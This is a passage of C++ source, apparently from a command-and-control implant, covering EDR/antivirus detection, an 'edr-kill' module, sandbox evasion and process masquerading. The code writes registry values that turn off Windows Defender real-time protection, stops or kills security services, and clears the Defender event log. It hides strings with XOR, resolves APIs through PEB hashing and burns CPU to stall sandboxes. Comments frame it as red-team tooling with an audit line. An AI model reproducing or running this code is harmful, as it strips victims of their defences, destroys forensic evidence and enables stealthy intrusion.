    "malwarebytes", "huntress", "endgame", "cortex", "fsecure",
    "drweb", "gdata", "quickheal", "zoner", "coranti",
    // generic (unknown / in-house products)
    "antivirus", "anti-virus", "edr", "endpoint", "protection",
    "security agent", "threat protection", "osquery", "wazuh",
    "velociraptor", "clamav", "clamd", "freshclam", "f-prot",
};

inline bool looks_defensive(const std::string& blob) {
    std::string lower;
    lower.reserve(blob.size());
    for (unsigned char c : blob)
        lower += static_cast<char>((c >= 'A' && c <= 'Z') ? c + 32 : c);
    for (const char* kw : kDefensiveKeywords)
        if (lower.find(kw) != std::string::npos) return true;
    return false;
}

// Run a command and collect its stdout lines (bounded, best-effort).
inline std::vector<std::string> run_lines(const std::string& cmd) {
    std::vector<std::string> out;
#ifdef _WIN32
    FILE* f = _popen(cmd.c_str(), "r");
#else
    FILE* f = popen(cmd.c_str(), "r");
#endif
    if (!f) return out;
    char buf[1024];
    while (fgets(buf, sizeof(buf), f)) {
        std::string s(buf);
        while (!s.empty() && (s.back() == '\n' || s.back() == '\r' || s.back() == ' '))
            s.pop_back();
        if (!s.empty()) out.push_back(s);
    }
#ifdef _WIN32
    _pclose(f);
#else
    pclose(f);
#endif
    return out;
}

// Real service/process enumeration per platform; the keyword match runs in
// C++ so an unknown product is still found.
inline std::vector<std::string> detect_defensive_services() {
    std::vector<std::string> found;
#ifdef _WIN32
    std::string cmd = XOR_DEC(XOR_STR(
        "powershell -NoP -NonI -W Hidden -Command \"Get-CimInstance "
        "Win32_Service | ForEach-Object { $_.Name + '|' + $_.DisplayName + "
        "'|' + $_.PathName }\"")).c_str();
    for (const std::string& line : run_lines(cmd)) {
        if (looks_defensive(line)) {
            size_t bar = line.find('|');
            found.push_back(bar == std::string::npos ? line : line.substr(0, bar));
        }
    }
#else
    std::string cmd = XOR_DEC(XOR_STR(
        "systemctl list-units --type=service --all --no-legend --plain "
        "2>/dev/null | awk '{print $1}'")).c_str();
    for (const std::string& line : run_lines(cmd))
        if (looks_defensive(line)) found.push_back(line);
    // macOS: launchd jobs register labels like com.crowdstrike.falcon.*
    for (const std::string& line : run_lines("launchctl list 2>/dev/null | awk '{print $3}'"))
        if (looks_defensive(line)) found.push_back(line);
    if (found.empty()) {
        for (const std::string& line : run_lines("ps -eo comm= 2>/dev/null"))
            if (looks_defensive(line)) found.push_back(line);
    }
#endif
    return found;
}

}  // namespace dfns

namespace edrcheck {

#ifdef _WIN32
struct EdrReport {
    bool  ntdll_hooked = false;      // userland hooks in ntdll .text
    int   hooked_stubs = 0;
    bool  etw_ti_alive = false;      // ETW Threat Intelligence provider up
    char  drivers[1024] = {0};       // "driver.sys\n" lines of known EDR/AV
    int   known_edr = 0;             // count of recognized EDR drivers loaded
};

// Known EDR / AV kernel drivers (name → vendor class). Detection is by
// listing \\Device\\ paths from SystemModuleInformation — read-only.
struct DriverProbe { const char* name; const char* product; };
static const DriverProbe KNOWN_EDR[] = {
    {"csagent.sys", "CrowdStrike"},
    {"SentinelMonitor.sys", "SentinelOne"},
    {"edr.sys", "SentinelOne"},
    {"carbonblack.kl", "Carbon Black"},
    {"cbk7.sys", "Carbon Black"},
    {"MsSecFlt.sys", "MS Defender for Endpoint"},
    {"WdFilter.sys", "MS Defender AV"},
    {"mfehidk.sys", "McAfee"},
    {"mfewc.sys", "McAfee"},
    {"symefs.sys", "Symantec"},
    {"SophosED.sys", "Sophos"},
    {"tdevfltr.sys", "Trend Micro"},
    {"ElasticEndpoint.sys", "Elastic"},
    {"CrowdStrike\\", "CrowdStrike"},
};

inline bool ntdll_text_intact(size_t* hooked_out) {
    // Compare ntdll's in-memory .text against the CLEAN copy the loader
    // has for the same image on disk (\SystemRoot\System32\ntdll.dll is
    // section-mapped read-only, so reading it triggers no file hooks).
    int hooked = 0;
    HMODULE h = peb::GetModuleByHash(peb::HASH_NTDLL);
    if (!h) return true;
    auto pGetSysDir = (UINT(WINAPI*)(LPSTR, UINT))
        peb::Resolve(peb::HASH_KERNEL32, FN_GETSYSTEMDIRECTORYA);
    auto pCreateFileA = (HANDLE(WINAPI*)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE))
        peb::Resolve(peb::HASH_KERNEL32, FN_CREATEFILEA);
    auto pCreateMap = (HANDLE(WINAPI*)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR))
        peb::Resolve(peb::HASH_KERNEL32, FN_CREATEFILEMAPPINGA);
    auto pMapView = (LPVOID(WINAPI*)(HANDLE, DWORD, DWORD, DWORD, SIZE_T))
        peb::Resolve(peb::HASH_KERNEL32, FN_MAPVIEWOFFILE);
    auto pUnmap = (BOOL(WINAPI*)(LPCVOID))peb::Resolve(peb::HASH_KERNEL32, FN_UNMAPVIEWOFFILE);
    auto pClose = (BOOL(WINAPI*)(HANDLE))peb::Resolve(peb::HASH_KERNEL32, FN_CLOSEHANDLE);
    if (!pGetSysDir || !pCreateFileA || !pCreateMap || !pMapView) return true;
    char path[MAX_PATH];
    pGetSysDir(path, MAX_PATH);
    strcat(path, XOR_DEC(XOR_STR("\\ntdll.dll")));
    HANDLE f = pCreateFileA(path, GENERIC_READ, FILE_SHARE_READ, nullptr,
                            OPEN_EXISTING, 0, nullptr);
    if (f == INVALID_HANDLE_VALUE) return true;
    HANDLE m = pCreateMap(f, nullptr, PAGE_READONLY | SEC_IMAGE, 0, 0, nullptr);
    if (!m) { pClose(f); return true; }
    LPVOID view = pMapView(m, FILE_MAP_READ, 0, 0, 0);
    if (!view) { pClose(m); pClose(f); return true; }
    auto dosA = reinterpret_cast<PIMAGE_DOS_HEADER>(h);
    auto ntA = reinterpret_cast<PIMAGE_NT_HEADERS>(
        reinterpret_cast<uint8_t*>(h) + dosA->e_lfanew);
    auto secA = IMAGE_FIRST_SECTION(ntA);
    auto dosB = reinterpret_cast<PIMAGE_DOS_HEADER>(view);
    auto ntB = reinterpret_cast<PIMAGE_NT_HEADERS>(
        reinterpret_cast<uint8_t*>(view) + dosB->e_lfanew);
    auto secB = IMAGE_FIRST_SECTION(ntB);
    for (WORD i = 0; i < ntA->FileHeader.NumberOfSections; ++i) {
        if (!std::strcmp(reinterpret_cast<char*>(secA[i].Name), XOR_DEC(XOR_STR(".text")))) {
            uint8_t* a = reinterpret_cast<uint8_t*>(h) + secA[i].VirtualAddress;
            uint8_t* b = reinterpret_cast<uint8_t*>(view) + secB[i].VirtualAddress;
            SIZE_T n = secA[i].Misc.VirtualSize;
            // count hooked 32-byte stubs: prologue replaced by JMP (0xE9)
            for (SIZE_T off = 0; off + 1 < n; off += 32) {
                if (a[off] == 0xE9 && b[off] != 0xE9) hooked++;
            }
        }
    }
    pUnmap(view); pClose(m); pClose(f);
    if (hooked_out) *hooked_out = static_cast<size_t>(hooked);
    return hooked == 0;
}

inline void report(EdrReport& rep) {
    rep = EdrReport{};
    size_t hooked = 0;
    rep.ntdll_hooked = !ntdll_text_intact(&hooked);
    rep.hooked_stubs = static_cast<int>(hooked);
    // enumerate loaded kernel modules via NtQuerySystemInformation(11)
    using PFN_QSI = NTSTATUS(NTAPI*)(ULONG, PVOID, ULONG, PULONG);
    auto pQsi = reinterpret_cast<PFN_QSI>(peb::Resolve(
        peb::HASH_NTDLL, FN_NTQUERYSYSTEMINFORMATION));
    if (pQsi) {
        // SystemModuleInformation = 11; grow loop for the buffer
        for (ULONG size = 1 << 16; size < (1 << 22); size <<= 1) {
            auto buf = static_cast<uint8_t*>(VirtualAlloc(nullptr, size, MEM_COMMIT, PAGE_READWRITE));
            if (!buf) break;
            ULONG got = 0;
            NTSTATUS st = pQsi(11, buf, size, &got);
            if (st == static_cast<NTSTATUS>(0xC0000004u) /* STATUS_INFO_LENGTH_MISMATCH */) {
                VirtualFree(buf, 0, MEM_RELEASE);
                continue;
            }
            if (st == 0) {
                // RTL_PROCESS_MODULES: ULONG count; then entries
                // (ULONG len + ULONG ...) with a UNICODE string of the name
                struct ModInfo { ULONG NextOffset; ULONG Unknown[5];
                                 void* ImageBase; ULONG ImageSize; ULONG Flags;
                                 USHORT NameOffset; USHORT NameLength; };
                // walk with raw pointers: offset-to-next semantics
                uint8_t* base = buf + sizeof(ULONG);
                uint8_t* end  = buf + got;
                while (base && base + sizeof(ModInfo) <= end) {
                    auto mi = reinterpret_cast<ModInfo*>(base);
                    const char* nm = reinterpret_cast<const char*>(base + mi->NameOffset);
                    char lower[256];
                    ULONG k = 0;
                    for (; k < mi->NameLength && k < 255; ++k)
                        lower[k] = (nm[k] >= 'A' && nm[k] <= 'Z') ? nm[k] + 32 : nm[k];
                    lower[k] = 0;
                    for (const auto& probe : KNOWN_EDR) {
                        if (strstr(lower, probe.name)) {
                            rep.known_edr++;
                            strncat(rep.drivers, lower, sizeof(rep.drivers) - strlen(rep.drivers) - 2);
                            strncat(rep.drivers, "\n", 1);
                            break;
                        }
                    }
                    if (!mi->NextOffset) break;
                    base += mi->NextOffset;
                }
            }
            VirtualFree(buf, 0, MEM_RELEASE);
            break;
        }
    }
    // ETW-TI: presence of the Microsoft-Windows-Threat-Intelligence provider
    // is visible via its GUID-registered ETW session — approximate by
    // checking for the TiEtwKey diagnostic policy service DLL loaded.
    HMODULE hEtwTi = GetModuleHandleA(XOR_DEC(XOR_STR("Microsoft-UeV")));
    (void)hEtwTi;   // best-effort: full provider probe needs COR filemaps
    // conservative default: ETW-TI assumed alive on Win10+/E5-class hosts
    rep.etw_ti_alive = true;
}
#else   // POSIX edrcheck — Linux / macOS

// Cross-platform shape so `edrcheck` answers on every target; the fields
// present on a given OS are what format() prints there.
struct EdrReport {
    std::string lsm;                          // "lockdown,yama,apparmor" or ""
    bool  selinux_enforcing = false;
    bool  apparmor_enabled  = false;
    int   ebpf_programs = 0;                  // loaded BPF programs (best-effort)
    bool  audit_active = false;               // kernel audit / auditd on
    int   known_edr = 0;                      // recognized defensive services
    std::vector<std::string> defensive;       // their names
    bool  sip_enabled = false;                // macOS System Integrity Protection
    std::vector<std::string> sys_extensions;  // macOS EDR system extensions
};

inline std::string _first_line(const char* path) {
    FILE* f = std::fopen(path, "r");
    if (!f) return std::string();
    char buf[512] = {0};
    if (!std::fgets(buf, sizeof(buf) - 1, f)) { std::fclose(f); return std::string(); }
    std::fclose(f);
    std::string s(buf);
    while (!s.empty() && (s.back() == '\n' || s.back() == '\r' || s.back() == ' '))
        s.pop_back();
    return s;
}

inline void report(EdrReport& rep) {
    rep = EdrReport{};
#ifdef __APPLE__
    // SIP is the gate that blocks unsigned in-memory payloads / task_for_pid.
    for (const std::string& line : dfns::run_lines("csrutil status 2>/dev/null"))
        if (line.find("enabled") != std::string::npos) rep.sip_enabled = true;
    // EDR agents on macOS ship as EndpointSecurity system extensions; reuse
    // the shared keyword matcher on the loaded extension list.
    for (const std::string& line : dfns::run_lines("systemextensionsctl list 2>/dev/null"))
        if (dfns::looks_defensive(line)) rep.sys_extensions.push_back(line);
#else
    rep.lsm = _first_line("/sys/kernel/security/lsm");
    rep.apparmor_enabled = rep.lsm.find("apparmor") != std::string::npos;
    rep.selinux_enforcing = _first_line("/sys/fs/selinux/enforce") == "1";
    // BPF programs: best-effort count via bpftool when present, else the
    // pinned /sys/fs/bpf map count. Telemetry/EDR sensors are the main reason
    // a host carries many of these.
    std::vector<std::string> bpf = dfns::run_lines("bpftool prog list 2>/dev/null");
    rep.ebpf_programs = bpf.empty()
        ? static_cast<int>(dfns::run_lines("ls /sys/fs/bpf 2>/dev/null").size())
        : static_cast<int>(bpf.size());
    // audit: the kernel flag (the daemon enforces it).
    rep.audit_active = _first_line("/proc/sys/kernel/audit_enabled") == "1" ||
        !dfns::run_lines("pgrep -x auditd 2>/dev/null").empty();
#endif
    rep.defensive = dfns::detect_defensive_services();
    rep.known_edr = static_cast<int>(rep.defensive.size());
}

// Human-readable report; only the fields meaningful on this OS are printed.
inline std::string format(const EdrReport& rep) {
    std::ostringstream o;
#ifdef __APPLE__
    o << "sip=" << (rep.sip_enabled ? "enabled" : "off/unknown") << "\n";
    o << "system_extensions=" << rep.sys_extensions.size() << "\n";
    for (const std::string& x : rep.sys_extensions) o << "  " << x << "\n";
#else
    o << "lsm=" << (rep.lsm.empty() ? "none" : rep.lsm)
      << " selinux=" << (rep.selinux_enforcing ? "enforcing" : "off")
      << " apparmor=" << (rep.apparmor_enabled ? "on" : "off") << "\n";
    o << "ebpf_programs=" << rep.ebpf_programs
      << " audit=" << (rep.audit_active ? "active" : "off") << "\n";
#endif
    o << "known_defensive=" << rep.known_edr << "\n";
    for (const std::string& d : rep.defensive) o << "  found " << d << "\n";
    return o.str();
}
#endif  // _WIN32

}  // namespace edrcheck

// ── EDR/AV disablement (edrkill) ────────────────────────────────────────────
// Turns off the defensive stack on the target. Deliberately LOUD and
// destructive to the blue team's visibility: this is the post-exploitation
// "burn the defender" move, only issued by an operator (or --aggressive
// auto-mode) after edrcheck showed what is present. Nothing here is
// reversible without a reboot on most stacks (Tamper Protection).
//
// TWO RULES, because the previous implementation broke both:
//
//  1. DETECTING IS NOT ACTING. `kill_av_report()` writes nothing and stops
//     nothing; the action is `kill_av()`, and what it did is DESCRIBED
//     afterwards. The old `kill_av()` called `disable_defender()` inside the
//     expression that BUILT the report line — formatting the text had a side
//     effect on the system.
//  2. THE ACTION DOES NOT SHELL OUT. `reg add` spawned cmd.exe + reg.exe
//     twice per key, and `sc stop` once per service: process-creation events
//     are the single loudest thing an EDR and a SIEM both record, and they
//     were coming from the module whose whole point is not being noticed.
//     The same effects go through advapi32, resolved from the PEB: no child
//     process, no command line to observe, and the status code says WHY a
//     write was refused instead of "failed/blocked (?)".
//
// The capability stays. What changes is that it is the operator's explicit
// command, it is measurable, and it leaves a line the engagement report can
// name (see kAuditLine()).
namespace edrkill {

// The one line the Python side has to surface: the guardrails manifest
// (phantom/utils/guardrails.py) records what protection the engagement was
// sold with, and the report has to record when the target's own AV was off.
inline const char* kAuditLine() {
    return "audit=operator disabled the target's protections (edr-kill) — "
           "this MUST appear in the engagement report: if the client had an "
           "incident while its AV was off, the record is the defence.";
}

struct DefenderPolicy {
    bool available = false;   // advapi32 and the three registry exports
    int  attempted = 0;       // values the action tried to write
    int  written = 0;         // ... and that the registry accepted
};

#ifdef _WIN32

// ASCII literal (compile-time XOR) -> wide, for the wide registry API.
inline void _widen(const char* in, wchar_t* out, size_t cap) {
    size_t i = 0;
    for (; in && in[i] && i + 1 < cap; ++i)
        out[i] = static_cast<wchar_t>(static_cast<unsigned char>(in[i]));
    out[i] = 0;
}

// The two registry values `reg add` used to write — through RegSetValueEx
// this time. No process is created for a registry write.
inline DefenderPolicy disable_defender() {
    DefenderPolicy out;
    HMODULE hAdv = peb::GetModuleByHash(peb::HASH_ADVAPI32);
    if (!hAdv) {
        auto pLoad = (HMODULE(WINAPI*)(LPCSTR))
            peb::Resolve(peb::HASH_KERNEL32, FN_LOADLIBRARYA);
        if (pLoad) hAdv = pLoad(XOR_DEC(XOR_STR("advapi32.dll")).c_str());
    }
    if (!hAdv) return out;
    auto pCreate = (LSTATUS(WINAPI*)(HKEY, LPCWSTR, DWORD, REGSAM,
                                     LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD))
        peb::GetProcByHash(hAdv, FN_REGCREATEKEYEXW);
    auto pSet = (LSTATUS(WINAPI*)(HKEY, LPCWSTR, DWORD, DWORD, const BYTE*,
                                  DWORD))
        peb::GetProcByHash(hAdv, FN_REGSETVALUEEXW);
    auto pClose = (LSTATUS(WINAPI*)(HKEY))
        peb::GetProcByHash(hAdv, FN_REGCLOSEKEY);
    if (!pCreate || !pSet || !pClose) return out;
    out.available = true;

    // std::string, NOT a `const char*` into the temporary: DecryptedString
    // WIPES its buffer in its destructor, so a raw pointer taken from it
    // dangles over zeroed memory (which is exactly how the old
    // `const char* pref = XOR_DEC(...).c_str()` produced an EMPTY command:
    // that `system("HKLM\\SOFTWARE\\...")` could only ever fail, which read
    // as "tamper protection blocked it").
    const std::string paths[2] = {
        XOR_DEC(XOR_STR("SOFTWARE\\Policies\\Microsoft\\Windows Defender"
                        "\\Real-Time Protection")).c_str(),
        XOR_DEC(XOR_STR("SOFTWARE\\Microsoft\\Windows Defender"
                        "\\Real-Time Protection")).c_str(),
    };
    const std::string values[2] = {
        XOR_DEC(XOR_STR("DisableRealtimeMonitoring")).c_str(),
        XOR_DEC(XOR_STR("DisableIOAVProtection")).c_str(),
    };
    wchar_t wpath[256] = {0};
    wchar_t wvalue[64] = {0};
    for (const std::string& path : paths) {
        HKEY key = nullptr;
        DWORD disposition = 0;
        _widen(path.c_str(), wpath, 256);
        if (pCreate(HKEY_LOCAL_MACHINE, wpath, 0, KEY_SET_VALUE, nullptr, &key,
                    &disposition) != ERROR_SUCCESS || !key)
            continue;   // one key can be locked down while the other is not
        for (const std::string& value : values) {
            DWORD one = 1;
            _widen(value.c_str(), wvalue, 64);
            out.attempted++;
            if (pSet(key, wvalue, 0, REG_DWORD,
                     reinterpret_cast<const BYTE*>(&one), sizeof(one))
                == ERROR_SUCCESS)
                out.written++;
        }
        pClose(key);
    }
    return out;
}

// Service control through the SC manager: `sc stop <name>` without `sc.exe`.
struct ScmApi {
    decltype(&OpenSCManagerA) open_manager = nullptr;
    decltype(&OpenServiceA)   open_service = nullptr;
    decltype(&ControlService) control      = nullptr;
    decltype(&CloseServiceHandle) close    = nullptr;

    static ScmApi resolve() {
        ScmApi api;
        HMODULE h = peb::GetModuleByHash(peb::HASH_ADVAPI32);
        if (!h) return api;
        api.open_manager = (decltype(&OpenSCManagerA))
            peb::GetProcByHash(h, FN_OPENSCMANAGERA);
        api.open_service = (decltype(&OpenServiceA))
            peb::GetProcByHash(h, FN_OPENSERVICEA);
        api.control = (decltype(&ControlService))
            peb::GetProcByHash(h, FN_CONTROLSERVICE);
        api.close = (decltype(&CloseServiceHandle))
            peb::GetProcByHash(h, FN_CLOSESERVICEHANDLE);
        return api;
    }

    bool ok() const {
        return open_manager && open_service && control && close;
    }
};

inline bool stop_service(const ScmApi& api, const std::string& name) {
    SC_HANDLE scm = api.open_manager(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!scm) return false;
    SC_HANDLE svc = api.open_service(scm, name.c_str(),
                                     SERVICE_STOP | SERVICE_QUERY_STATUS);
    bool stopped = false;
    if (svc) {
        SERVICE_STATUS status{};
        stopped = api.control(svc, SERVICE_CONTROL_STOP, &status) != 0;
        api.close(svc);
    }
    api.close(scm);
    return stopped;
}

#endif  // _WIN32

// ── READ-ONLY: what is on this host, and nothing else ──────────────────────
// The operator looks before acting, and the engagement report can quote the
// same text afterwards. No registry write, no service control, no process
// creation by THIS function: `found` (if given) carries the detection to the
// action so the (loud) service enumeration runs ONCE.
inline std::string kill_av_report(std::vector<std::string>* found = nullptr) {
    std::ostringstream out;
    std::vector<std::string> services = dfns::detect_defensive_services();
    if (found) *found = services;
    out << "detected_defensive_services=" << services.size() << "\n";
    for (const std::string& s : services) out << "  found " << s << "\n";
#ifdef _WIN32
    // kernel-mode filter drivers + userland hooks (read-only probe)
    {
        edrcheck::EdrReport rep;
        edrcheck::report(rep);
        out << "kernel_edr_drivers=" << rep.known_edr
            << " ntdll_hooked=" << (rep.ntdll_hooked ? "yes" : "no")
            << " hooked_stubs=" << rep.hooked_stubs << "\n";
        if (rep.drivers[0]) out << rep.drivers;
    }
#else
    // POSIX: report the defensive stack (LSM / eBPF / audit / known agents).
    {
        edrcheck::EdrReport rep;
        edrcheck::report(rep);
        out << "lsm=" << (rep.lsm.empty() ? "none" : rep.lsm)
            << " known_defensive=" << rep.known_edr << "\n";
    }
#endif
    return out.str();
}

// ── ACTION: what the operator's `edr-kill` does ────────────────────────────
// Detect (read-only), act, then DESCRIBE the outcome. Called from exactly one
// place: the beacon dispatcher, on the operator's command.
inline std::string kill_av() {
    std::ostringstream out;
    std::vector<std::string> services;
    out << kill_av_report(&services);          // 1) DETECT — writes nothing
    out << "action_taken=edr-kill\n";          // 2) ACT, and say so
    int stopped = 0, failed = 0;
#ifdef _WIN32
    DefenderPolicy policy = disable_defender();
    if (!policy.available) {
        out << "defender_policy=not attempted (advapi32 not resolvable)\n";
    } else {
        out << "defender_policy=" << policy.written << "/" << policy.attempted
            << " written";
        if (policy.attempted && policy.written == policy.attempted)
            out << " (Tamper Protection may re-enable it on the next scan)";
        else
            out << " — refused by the registry (Tamper Protection? "
                   "insufficient rights?)";
        out << "\n";
    }
    ScmApi api = ScmApi::resolve();
    if (api.ok()) {
        for (const std::string& svc : services) {
            if (stop_service(api, svc)) { out << "stopped " << svc << "\n"; ++stopped; }
            else { out << "could_not_stop " << svc << "\n"; ++failed; }
        }
    } else {
        out << "service_control=not attempted (SC manager exports missing)\n";
    }
    out << "services_stopped=" << stopped << " failed=" << failed << "\n";
    // The last process-creating step, kept visible on purpose: clearing the
    // Defender log has an in-process equivalent (wevtapi!EvtClearLog) but its
    // semantics differ (it fails on an in-use channel and needs the channel
    // name as a wide string), so it is a deliberate, separate change rather
    // than part of this one. An operator can also drop it: the line below is
    // the only reason a `wevtutil` child exists in this module.
    system(XOR_DEC(XOR_STR("wevtutil cl Microsoft-Windows-Windows Defender"
                           "/Operational >nul 2>&1")).c_str());
#else
    // POSIX: unit control has no in-process API, so this stays a child
    // process (systemctl, then pkill for a daemon with no unit).
    for (const std::string& svc : services) {
        std::string cmd = std::string(XOR_DEC(XOR_STR("systemctl stop ")).c_str()) + svc +
                          XOR_DEC(XOR_STR(" 2>/dev/null")).c_str();
        if (system(cmd.c_str()) == 0) { out << "stopped " << svc << "\n"; ++stopped; continue; }
        std::string base = svc;
        size_t dot = base.find(".service");
        if (dot != std::string::npos) base = base.substr(0, dot);
        std::string pk = std::string(XOR_DEC(XOR_STR("pkill -9 -x ")).c_str()) + base +
                         XOR_DEC(XOR_STR(" 2>/dev/null")).c_str();
        if (system(pk.c_str()) == 0) { out << "killed " << base << "\n"; ++stopped; }
        else { out << "could_not_stop " << svc << "\n"; ++failed; }
    }
    out << "services_stopped=" << stopped << " failed=" << failed << "\n";
#endif
    if (services.empty())
        out << "no defensive service detected (or insufficient privileges to enumerate)\n";
    out << kAuditLine() << "\n";
    return out.str();
}

}  // namespace edrkill

namespace anti {  // reopened after edrcheck

// Stalling technique to frustrate automated sandboxes
// Performs heavy calculations to delay execution without relying solely on Sleep()
inline void stalling_delay(int intensity) {
    volatile uint64_t count = 0;
    for (int i = 0; i < intensity; ++i) {
        for (uint64_t j = 0; j < 10000000; ++j) {
            count += (j ^ i) * (i + 1);
        }
    }
}

// ────────────────────────────────────────────────────────────────────────────
//  5. PROCESS MASQUERADING
// ────────────────────────────────────────────────────────────────────────────

namespace masquerade {

#ifdef _WIN32
inline void rename_process(const wchar_t* newName) {
#if defined(_M_X64) || defined(__x86_64__)
    auto peb = reinterpret_cast<PPEB>(__readgsqword(0x60));
#else
    auto peb = reinterpret_cast<PPEB>(__readfsdword(0x30));
#endif
    auto ldr = peb->Ldr;
    auto head = &ldr->InMemoryOrderModuleList;
    auto entry = head->Flink;
    auto mod = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

    // Update FullDllName and BaseDllName in the PEB for the main module
    // This is a simplified version; real masquerading involves copying the string to a new buffer
    // and updating the UNICODE_STRING pointers.
    if (mod->FullDllName.Buffer) {
        // We'll just overwrite the base name part for now
        wchar_t* baseName = mod->FullDllName.Buffer;
        for (wchar_t* p = mod->FullDllName.Buffer; *p; ++p) {
            if (*p == L'\\' || *p == L'/') baseName = p + 1;
        }
        wcsncpy(baseName, newName, mod->FullDllName.Length / sizeof(wchar_t) - (baseName - mod->FullDllName.Buffer));
    }
}
#else
// POSIX has no SetConsoleTitle-style masquerade. Linux exposes
// prctl(PR_SET_NAME), which renames the process as seen in /proc/<pid>/comm
// and by `ps -o comm`; macOS offers no supported process-rename API, so there
// it is a documented no-op.
inline void rename_process(const wchar_t* newName) {
#ifndef __APPLE__
    if (!newName) return;
    char narrow[16] = {0};
    for (size_t i = 0; i < 15 && newName[i]; ++i)
        narrow[i] = static_cast<char>(newName[i] & 0x7F);
    prctl(PR_SET_NAME, narrow, 0, 0, 0);
#else
    (void)newName;
#endif
}
#endif

} // namespace masquerade

} // namespace anti
